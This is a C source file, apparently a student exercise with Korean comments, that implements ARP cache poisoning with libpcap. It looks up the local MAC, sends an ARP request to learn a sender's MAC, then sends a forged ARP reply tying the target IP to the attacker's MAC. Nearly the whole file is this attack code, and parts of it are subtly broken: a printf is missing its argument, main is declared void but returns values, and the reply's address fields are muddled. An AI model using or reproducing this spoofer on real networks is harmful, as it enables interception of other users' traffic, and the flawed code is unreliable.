#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <pcap/pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>

#include "dumpcode.h"

#define SRC_MAC 6

#define MAC_SIZE 6


typedef struct etherhdr{
  char dstMac[6];
  char srcMac[6];
  char etherType[2];
} ETHERHDR;

typedef struct arphdr_jtj{
  ETHERHDR eh;
  u_char ht[2];
  u_char pt[2];
  u_char hal[1];
  u_char pal[1];
  u_char op[2];
  u_char sha[6];
  u_char spa[4];
  u_char dha[6];
  u_char dpa[4];
} ARPHDR;

char* getMac(u_char *packet, int i) {
	static char buf[MAC_SIZE] = "";
    memcpy(buf, packet, 6);
	return buf;
}


void main(int argc, char **argv)
{
    pcap_t *handle;					/* Session handle */
    char *dev;						/* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    struct bpf_program fp;			/* The compiled filter */
    bpf_u_int32 mask;				/* Our netmask */
    bpf_u_int32 net;				/* Our IP */
    struct pcap_pkthdr header;		/* The header that pcap gives us */
    u_char packet[100];			/* The actual packet */
    char *recvPacket;

    char* victim;
    char* target;

    if(argc != 4)   {
        printf("\n\nUsage : %s [network] [Sender] [target]\n\n");
        return 2;
    }


    struct in_addr iaddr;

    dev = argv[1];

  /* Error 제어 { */
    if (dev == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) { fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf); net = 0; mask = 0; }
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
  /*}*/




  // 맥 주소 받기
  // 성경이 누나에게 받은 부분
    int fd;
    struct ifreq ifr;
    struct ether_header *ETH;
    struct ether_arp arph;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);  //ip address
    struct in_addr my_ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
    ioctl(fd, SIOCGIFHWADDR, &ifr); //mac address
    u_int8_t my_mac[ETH_ALEN];
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    close(fd);
  // 끝



    ARPHDR sendHdr;

    // u_char dstMac[7] = "\x00\x50\x56\xc0\x00\x08";
    u_char *srcMac = my_mac;
    u_char dstMac[7] = "\xff\xff\xff\xff\xff\xff";

    memcpy(sendHdr.eh.dstMac, dstMac, 6);
    memcpy(sendHdr.eh.srcMac, srcMac, 6);
    memcpy(sendHdr.eh.etherType, "\x08\x06", 2); // ARP

    memcpy(sendHdr.ht, "\x00\x01", 2);
    memcpy(sendHdr.pt, "\x08\x00", 2);
    memcpy(sendHdr.hal, "\x06", 1);
    memcpy(sendHdr.pal, "\x04", 1);
    memcpy(sendHdr.op, "\x00\x01", 2); // OPCODE

    memcpy(sendHdr.sha, srcMac, 6);

    inet_pton(AF_INET, argv[2], &iaddr.s_addr);
    memcpy(sendHdr.spa, &iaddr.s_addr, 4); //C0A8EE82 // "\xc0\xa8\x20\xfe"

    memcpy(sendHdr.dha, "\x00\x00\x00\x00\x00\x00", 6);

    inet_pton(AF_INET, argv[3], &iaddr.s_addr);
    memcpy(sendHdr.dpa, &iaddr.s_addr, 4); // "\xc0\xa8\x20\x01"

    memset(packet, 0x00, 100);
    memcpy(packet, (void *)&sendHdr, sizeof(sendHdr));

    pcap_sendpacket(handle, packet, 60);

    char yourmac[7];

    int chk = 0;
    while(1) {
    	chk = pcap_next_ex(handle, &header, &recvPacket);
		if(chk != 1 ) continue;
        if(recvPacket[12] == 8 && recvPacket[13] == 6)    {
            printf("\n%x-%x", recvPacket[20], recvPacket[21]);
            if(recvPacket[20] == 0 && recvPacket[21] == 2) {
                dumpcode(recvPacket, 60);
                memcpy(yourmac, recvPacket + 22, 6);
                break;
            }
        }
	}

    // printf("%s\n", ether_ntoa((const struct ether_addr*)yourmac));



    memcpy(sendHdr.eh.dstMac, yourmac, 6);
    memcpy(sendHdr.eh.srcMac, srcMac, 6);
    memcpy(sendHdr.eh.etherType, "\x08\x06", 2); // ARP

    memcpy(sendHdr.ht, "\x00\x01", 2);
    memcpy(sendHdr.pt, "\x08\x00", 2);
    memcpy(sendHdr.hal, "\x06", 1);
    memcpy(sendHdr.pal, "\x04", 1);
    memcpy(sendHdr.op, "\x00\x02", 2); // OPCODE

    memcpy(sendHdr.dha, srcMac, 6);

    inet_pton(AF_INET, argv[2], &iaddr.s_addr);
    memcpy(sendHdr.dpa, &iaddr.s_addr, 4); //C0A8EE82 // "\xc0\xa8\x20\xfe"

    memcpy(sendHdr.sha, my_mac, 6);

    inet_pton(AF_INET, argv[3], &iaddr.s_addr);
    memcpy(sendHdr.spa, &iaddr.s_addr, 4); // "\xc0\xa8\x20\x01"

    memset(packet, 0x00, 100);
    memcpy(packet, (void *)&sendHdr, sizeof(sendHdr));

    pcap_sendpacket(handle, packet, 60);


    return;
}
